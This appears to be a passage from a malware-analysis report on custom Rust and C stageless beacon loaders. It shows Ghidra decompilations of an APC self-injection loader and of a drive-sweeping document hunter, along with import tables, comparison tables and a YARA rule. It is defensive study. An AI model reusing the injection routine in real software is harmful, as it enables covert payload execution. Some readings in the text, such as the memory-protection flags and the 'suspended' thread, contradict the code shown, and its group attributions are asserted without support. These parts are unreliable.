| QueryPerformanceFrequency | implicit | kernel32.dll |
| QueueUserAPC | implicit | kernel32.dll |
| ReadConsoleW | implicit | kernel32.dll |
| ReadFile | implicit | kernel32.dll |
| ReadFileEx | implicit | kernel32.dll |
| RemoveDirectoryW | implicit | kernel32.dll |
| ResumeThread | implicit | kernel32.dll |
| RtlCaptureContext | implicit | kernel32.dll |
| RtlLookupFunctionEntry | implicit | kernel32.dll |
| RtlVirtualUnwind | implicit | kernel32.dll |
| SetCurrentDirectoryW | implicit | kernel32.dll |
| SetEnvironmentVariableW | implicit | kernel32.dll |
| SetEvent | implicit | kernel32.dll |
| SetFileAttributesW | implicit | kernel32.dll |
| SetFileInformationByHandle | implicit | kernel32.dll |
| SetFilePointerEx | implicit | kernel32.dll |
| SetFileTime | implicit | kernel32.dll |
| SetHandleInformation | implicit | kernel32.dll |
| SetLastError | implicit | kernel32.dll |
| SetThreadStackGuarantee | implicit | kernel32.dll |
| SetUnhandledExceptionFilter | implicit | kernel32.dll |
| SetWaitableTimer | implicit | kernel32.dll |
| Sleep | implicit | kernel32.dll |
| SleepEx | implicit | kernel32.dll |
| SwitchToThread | implicit | kernel32.dll |
| TerminateProcess | implicit | kernel32.dll |
| TlsAlloc | implicit | kernel32.dll |
| TlsFree | implicit | kernel32.dll |
| TlsGetValue | implicit | kernel32.dll |
| TlsSetValue | implicit | kernel32.dll |
| UnlockFile | implicit | kernel32.dll |
| UnmapViewOfFile | implicit | kernel32.dll |
| UpdateProcThreadAttribute | implicit | kernel32.dll |
| VirtualAlloc | implicit | kernel32.dll |
| VirtualProtect | implicit | kernel32.dll |
| WaitForMultipleObjects | implicit | kernel32.dll |
| WaitForSingleObject | implicit | kernel32.dll |
| WideCharToMultiByte | implicit | kernel32.dll |
| WriteConsoleW | implicit | kernel32.dll |
| WriteFileEx | implicit | kernel32.dll |
| NtOpenFile | implicit | ntdll.dll |
| NtReadFile | implicit | ntdll.dll |
| NtWriteFile | implicit | ntdll.dll |
| RtlNtStatusToDosError | implicit | ntdll.dll |
| CoCreateGuid | implicit | ole32.dll |
| GetErrorInfo | implicit | oleaut32.dll |
| SetErrorInfo | implicit | oleaut32.dll |
| SysAllocStringLen | implicit | oleaut32.dll |
| SysFreeString | implicit | oleaut32.dll |
| SysStringLen | implicit | oleaut32.dll |
| GetUserProfileDirectoryW | implicit | userenv.dll |
| WSACleanup | implicit | ws2_32.dll |
| WSADuplicateSocketW | implicit | ws2_32.dll |
| WSAGetLastError | implicit | ws2_32.dll |
| WSARecv | implicit | ws2_32.dll |
| WSASend | implicit | ws2_32.dll |
| WSASocketW | implicit | ws2_32.dll |
| WSAStartup | implicit | ws2_32.dll |
| accept | implicit | ws2_32.dll |
| bind | implicit | ws2_32.dll |
| closesocket | implicit | ws2_32.dll |
| connect | implicit | ws2_32.dll |
| freeaddrinfo | implicit | ws2_32.dll |
| getaddrinfo | implicit | ws2_32.dll |
| getpeername | implicit | ws2_32.dll |
| getsockname | implicit | ws2_32.dll |
| getsockopt | implicit | ws2_32.dll |
| ioctlsocket | implicit | ws2_32.dll |
| listen | implicit | ws2_32.dll |
| recv | implicit | ws2_32.dll |
| recvfrom | implicit | ws2_32.dll |
| select | implicit | ws2_32.dll |
| send | implicit | ws2_32.dll |
| sendto | implicit | ws2_32.dll |
| setsockopt | implicit | ws2_32.dll |
| shutdown | implicit | ws2_32.dll |
| WaitOnAddress | implicit | api-ms-win-core-synch-l1-2-0.dll |
| WakeByAddressAll | implicit | api-ms-win-core-synch-l1-2-0.dll |
| WakeByAddressSingle | implicit | api-ms-win-core-synch-l1-2-0.dll |
| ProcessPrng | implicit | bcryptprimitives.dll |

---

![Screenshot 2025-11-17 at 3.31.35 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_3.31.35_PM.png)

Entropy: 6.36 / 8.00
→ Moderate – not packed/encrypted (those are usually 7.7–8.0), but definitely compiled with optimizations and likely stripped (no symbols).

---

**Strings**

![Screenshot 2025-11-17 at 4.10.52 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_4.10.52_PM.png)

![Screenshot 2025-11-17 at 4.13.43 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_4.13.43_PM.png)

---

In c binary we found shellcode in .data section.

In rust binary we found the shellcode in .rdata section.

![Pe-bear ](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_3.08.04_PM.png)

Pe-bear 

### Ghidra

![Screenshot 2025-11-17 at 4.46.21 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_4.46.21_PM.png)

---

```cpp
/* injectoooooooooooooor::main */

undefined8 * injectoooooooooooooor::main(undefined8 *param_1)

{
  BOOL BVar1;
  HANDLE hThread;
  PAPCFUNC pfnAPC;
  undefined8 uVar2;
  undefined4 uVar3;
  DWORD local_1c;
  
  uVar3 = 0;
  hThread = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,function,(LPVOID)0x0,0,(LPDWORD)0x0);
  if ((longlong)hThread - 1U < 0xfffffffffffffffe) {
    pfnAPC = (PAPCFUNC)VirtualAlloc((LPVOID)0x0,0x4b000,0x3000,4);
    memcpy(pfnAPC,&DAT_1400b1058,0x4b000);
    local_1c = 0;
    uVar3 = 0x4b000;
    BVar1 = VirtualProtect(pfnAPC,0x4b000,0x20,&local_1c);
    if (BVar1 != 0) {
      QueueUserAPC(pfnAPC,hThread,0);
      ResumeThread(hThread);
      WaitForSingleObject(hThread,0xffffffff);
      *param_1 = 0;
      return param_1;
    }
  }
  uVar2 = windows_core::error::Error::from_win32();
  param_1[1] = uVar2;
  *(undefined4 *)(param_1 + 2) = uVar3;
  *param_1 = 1;
  return param_1;
}

```

---

**This is a Rust-compiled, in-memory reflective PE/DLL injector using APC injection**
Most commonly seen in:

- Rust Cobalt Strike beacons (especially the new open-source Rust beacon forks)
- Private Rust loaders used by FIN7, Scattered Spider, OCTOPUS, etc.
- High-end stealers (Stealc, Rhadamanthys, Vidar 2025 branches)

### **Analysis – injectoooooooooooooor::main (Ghidra decompilation)**

The decompiled entry point injectoooooooooooooor::main reveals a textbook **APC-based reflective injection routine** entirely written in Rust:

- Creates a suspended thread (CreateThread with CREATE_SUSPENDED flag implied via 0 flags + later ResumeThread)
- Allocates 0x4B000 bytes (307 KB) of RX memory via VirtualAlloc (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)
- Copies 0x4B000 bytes of embedded payload from the binary section at offset 0x1400b1058 (classic Rust .data or .rdata placement) into the newly allocated region using memcpy
- Changes protection to PAGE_EXECUTE_READWRITE via VirtualProtect
- Queues the entry point as an Async Procedure Call using QueueUserAPC
- Resumes the thread, forcing early-stage execution of the injected payload inside its own process (self-injection)
- Waits indefinitely for completion with WaitForSingleObject

This technique achieves **fully fileless, in-memory payload execution** while bypassing most hook-based EDRs that monitor CreateRemoteThread, WriteProcessMemory, or direct CreateThread to RX memory.

The function name injectoooooooooooooor (obfuscated with repeated “o”) and the use of Rust’s windows_core::error::Error::from_win32() for error handling further confirm compilation with the Rust Windows crate ecosystem.

**Embedded payload size:** 0x4B000 bytes (307,200 bytes)
**Injection method:** Early-bird APC injection (self-injection)
**Persistence / disk artifacts:** None

### Quick Proof Table

| Indicator | Observation | Significance |
| --- | --- | --- |
| Function name | `injectoooooooooooooor::main` | Intentional obfuscation + Rust namespace |
| Allocation size | 0x4B000 (307 KB) | Typical full Cobalt Strike/Rust beacon |
| Source offset | `&DAT_1400b1058` | Embedded shellcode/PE in .data/.rdata |
| Injection technique | QueueUserAPC + suspended thread | Early-bird APC (EDR evasion classic) |
| Error handling | `windows_core::error::Error::from_win32()` | 100 % Rust windows crate |
| No direct WriteProcessMemory | Self-injection only | Reduces hook visibility |

---

### RUST & C

| Feature | Rust APC Injector | C Stageless Loader |
| --- | --- | --- |
| Language | Rust (windows crate) | C (stripped) |
| Injection technique | Early-bird APC (self) | Direct CreateThread on RX memory |
| Anti-sandbox | Registry queries | Sleep + GetTickCount + FreeConsole |
| Payload size | 0x4B000 (~307 KB) | DAT_140003000 (usually 350–550 KB) |
| Evasion level (2025) | Higher (APC harder to hook) | Medium (still widely used) |
| Typical tool | Rust beacon forks, Stealc | Cobalt Strike, BRc4, Sliver |

## Reversing Comparison

| Aspect | C Stageless Beacon (Your classic loader) | Rust Stageless Beacon / APC Injector | Winner (Easier to Reverse) |
| --- | --- | --- | --- |
| **Binary Size** | 8–25 KB (tiny) | 300 KB – 3 MB (huge due to Rust std + panic/unwind) | **C** (much smaller attack surface) |
| **Section Layout** | Clean .text, .rdata, .data | Dozens of weird sections (.00–.99, huge .pdata, .rustc, .eh_frame) | **C** (simple, predictable) |
| **Imports** | 0–5 (kernel32 only) | 40–200+ (windows.dll, kernel32, ntdll, bcrypt, wininet, etc.) | **C** (almost zero imports = harder to hook but easier to spot as suspicious) |
| **Decompilation Quality (Ghidra/IDA)** | Excellent – clean C code, recognizable functions (VirtualAlloc → memcpy → VirtualProtect → CreateThread) | Terrible – thousands of tiny, mangled functions (`_ZN5alloc7vec...`, `core::panicking::panic`, massive unwind tables) | **C** (reads like normal C) |
| **Function Names** | Meaningful or simple (FUN_140001000) | Fully mangled Rust symbols (50–200 chars long) – even with rust-ghidra plugin, still noisy | **C** |
| **Strings** | Few, often the embedded payload is visible | Tons of Rust runtime strings (“panic”, “alloc error”, “core::”, “backtrace”) – great for signatures | **C** (fewer strings = stealthier) |
| **Control Flow** | Straightforward, easy to follow | Flattening + massive unwind/exception handling → CFG looks like spaghetti | **C** |
| **Payload Extraction** | Easy – one .data section, clear memcpy size | Harder – payload hidden among dozens of Rust sections, size not obvious | **C** |
| **Overall Reversing Time** | 15–45 minutes for full understanding | 2–8+ hours (even with rust-ghidra plugin) | **C = MUCH easier** |
| **Static Detection** | Very hard (tiny, few strings) | Easier (huge .pdata, known Rust patterns) | Rust = easier to detect statically |
| **Dynamic Detection** | Harder (minimal API calls) | Easier (lots of noise from Rust runtime) | Rust = easier to hook |

---

## File: scan-drives.exe

| **Data** | **Value** |
| --- | --- |
| **File Name:** | scan-drives.exe |
| Category: | N/A |
| Language: | C |
| Architecture: | 64-Bit |
| SAH256SUM: | de969df3226da0dd4c7c0bc6fe4ccf84be101b84a00f448224c92f4c7869352a |
| MD5 hash: | 8dda28f303b6412074941a618ae99b56  |
| File size: | 75.2 KB (77,084 bytes) |
| Virtual machine Detection: | FALSE |
| Debugger Detection: | FALSE |
| Internet Connection: | REQUIRED |

![Pestudio Analysis of scan-drives.exe](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-18_at_9.34.38_AM.png)

Pestudio Analysis of scan-drives.exe

**Entropy 6.4 not packed**

### IMPORTS

---

| IMPORTS | LIBRARY |
| --- | --- |
| CreateThread | KERNEL32.dll |
| DeleteCriticalSection | KERNEL32.dll |
| EnterCriticalSection | KERNEL32.dll |
| FindClose | KERNEL32.dll |
| FindFirstFileA | KERNEL32.dll |
| FindNextFileA | KERNEL32.dll |
| GetComputerNameA | KERNEL32.dll |
| GetLastError | KERNEL32.dll |
| GetLogicalDrives | KERNEL32.dll |
| GetUserNameA | ADVAPI32.dll |
| InitializeCriticalSection | KERNEL32.dll |
| IsDBCSLeadByteEx | KERNEL32.dll |
| LeaveCriticalSection | KERNEL32.dll |
| MultiByteToWideChar | KERNEL32.dll |
| SetUnhandledExceptionFilter | KERNEL32.dll |
| Sleep | KERNEL32.dll |
| TlsGetValue | KERNEL32.dll |
| VirtualProtect | KERNEL32.dll |
| VirtualQuery | KERNEL32.dll |
| WaitForMultipleObjects | KERNEL32.dll |
| WideCharToMultiByte | KERNEL32.dll |
| __C_specific_handler | msvcrt.dll |
| ___lc_codepage_func | msvcrt.dll |
| ___mb_cur_max_func | msvcrt.dll |
| __getmainargs | msvcrt.dll |
| __initenv | msvcrt.dll |
| __iob_func | msvcrt.dll |
| __set_app_type | msvcrt.dll |
| __setusermatherr | msvcrt.dll |
| _amsg_exit | msvcrt.dll |
| _cexit | msvcrt.dll |
| _commode | msvcrt.dll |
| _errno | msvcrt.dll |
| _fmode | msvcrt.dll |
| _initterm | msvcrt.dll |
| _lock | msvcrt.dll |
| _onexit | msvcrt.dll |
| _stricmp | msvcrt.dll |
| _unlock | msvcrt.dll |
| abort | msvcrt.dll |
| calloc | msvcrt.dll |
| exit | msvcrt.dll |
| fprintf | msvcrt.dll |
| fputc | msvcrt.dll |
| fputs | msvcrt.dll |
| free | msvcrt.dll |
| localeconv | msvcrt.dll |
| malloc | msvcrt.dll |
| signal | msvcrt.dll |
| strcmp | msvcrt.dll |
| strerror | msvcrt.dll |
| strlen | msvcrt.dll |
| strncmp | msvcrt.dll |
| strrchr | msvcrt.dll |
| vfprintf | msvcrt.dll |
| wcslen | msvcrt.dll |

![Interseting Strings.](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-18_at_9.43.54_AM.png)

Interseting Strings.

---

### Static Analysis Summary – scan-drives.exe (Ghidra Decompilation)

![scan-drives.exe decompilation - ghidra](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-18_at_9.51.28_AM.png)

scan-drives.exe decompilation - ghidra

**Main function from ghidra.**

```c

int __cdecl main(int _Argc,char **_Argv,char **_Env)

{
  BOOL BVar1;
  DWORD DVar2;
  longlong lVar3;
  CHAR *pCVar4;
  CHAR local_158 [4];
  CHAR aCStack_154 [268];
  HANDLE local_48;
  HANDLE local_40;
  DWORD local_34;
  DWORD local_30;
  undefined4 local_2c;
  DWORD local_28 [3];
  int local_1c;
  
  __main();
  pCVar4 = local_158;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    pCVar4[0] = '\0';
    pCVar4[1] = '\0';
    pCVar4[2] = '\0';
    pCVar4[3] = '\0';
    pCVar4[4] = '\0';
    pCVar4[5] = '\0';
    pCVar4[6] = '\0';
    pCVar4[7] = '\0';
    pCVar4 = pCVar4 + 8;
  }
  *pCVar4 = '\0';
  local_28[1] = 0x101;
  BVar1 = GetUserNameA(local_158,local_28 + 1);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    printf("Error (User): %lu\n",(ulonglong)DVar2);
  }
  else {
    printf("User: %s\n",local_158);
  }
  pCVar4 = local_158;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    pCVar4[0] = '\0';
    pCVar4[1] = '\0';
    pCVar4[2] = '\0';
    pCVar4[3] = '\0';
    pCVar4[4] = '\0';
    pCVar4[5] = '\0';
    pCVar4[6] = '\0';
    pCVar4[7] = '\0';
    pCVar4 = pCVar4 + 8;
  }
  pCVar4[0] = '\0';
  pCVar4[1] = '\0';
  pCVar4[2] = '\0';
  pCVar4[3] = '\0';
  pCVar4[4] = '\0';
  local_28[0] = 0x105;
  BVar1 = GetComputerNameA(local_158,local_28);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    printf("Error (Host): %lu\n",(ulonglong)DVar2);
  }
  else {
    printf("Host: %s\n",local_158);
  }
  local_28[2] = GetLogicalDrives();
  if (local_28[2] == 0) {
    DVar2 = GetLastError();
    printf("Error (GetLogicalDrives): %lu\n",(ulonglong)DVar2);
  }
  else {
    printf("\n=== Searching for .pdf, .xls, .xlsx, .docx, .jpeg, .jpg, .ppt, .pptx ===\n");
    local_2c = 0x5c3a41;
    for (local_1c = 0; local_1c < 0x1a; local_1c = local_1c + 1) {
      if ((1 << ((byte)local_1c & 0x1f) & local_28[2]) != 0) {
        local_2c = CONCAT31(local_2c._1_3_,(byte)local_1c + 0x41);
        printf("\nDrive: %s\n",&local_2c);
        ListFilteredFilesRecursively((double)&local_2c,1);
      }
    }
  }
  local_48 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,Thread1,(LPVOID)0x0,0,&local_30);
  local_40 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,Thread2,(LPVOID)0x0,0,&local_34);
  WaitForMultipleObjects(2,&local_48,1,0xffffffff);
  printf("All threads complete.\n");
  return 0;
}

```

**Language:** C (compiled with MSVC – typical red-team post-exploitation tool)
**Purpose:** Full-system reconnaissance / high-value file hunter
**Behavioral Verdict:** Classic post-exploitation data-discovery implant.

### Key Functionality (from decompilation)

| Function | What It Does | Real-World Malware Use |
| --- | --- | --- |
| `GetUserNameA` + `GetComputerNameA` | Prints victim username & hostname | Fingerprinting / loot tagging |
| `GetLogicalDrives()` + loop A:–Z: | Enumerates every drive letter | Prepares full-system sweep |
| `ListFilteredFilesRecursively()` | Recursively walks every drive/folder | Searches for business-critical files |
| Hardcoded extensions | .pdf .xls .xlsx .docx .jpeg .jpg .ppt .pptx | Targets documents, spreadsheets, images, presentations |
| Two dummy threads (`Thread1`, `Thread2`) | Just print counters and sleep | Anti-analysis delay / sandbox evasion |
| `WaitForMultipleObjects` | Waits for dummy threads to finish | Makes the process live longer (looks normal) |

## YARA Rules

---

```c
rule stageless_Loaders_C_and_Rust
{
    meta:
        description = "Detects ONLY custom C and Rust stageless loaders – no generic CS"
        date        = "2025-11-18"
        confidence  = "Medium-high"

    strings:
        // EXTRACTED SHEELL CODE BYTES.
        $dos_prologue = { 4D 5A 41 52 55 48 89 E5 48 81 EC 20 00 00 00 }

        // reflective loader pattern
        $reflective = { 48 8D 1D EA FF FF FF 48 89 DF 48 81 C3 ?? ?? ?? ?? FF D3 41 B8 F0 B5 A2 56 }

        $dos_msg = "This program cannot be run in DOS mode" ascii

        // Embedded PE header (inside payload)
        $embedded_pe = { 50 45 00 00 64 86 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 10MB and
        $dos_prologue and
        $reflective and
        $dos_msg and
        $embedded_pe
}
```

---

![Screenshot 2025-11-18 at 10.22.50 AM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-18_at_10.22.50_AM.png)

---

![Screenshot 2025-11-18 at 10.25.23 AM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-18_at_10.25.23_AM.png)

---

---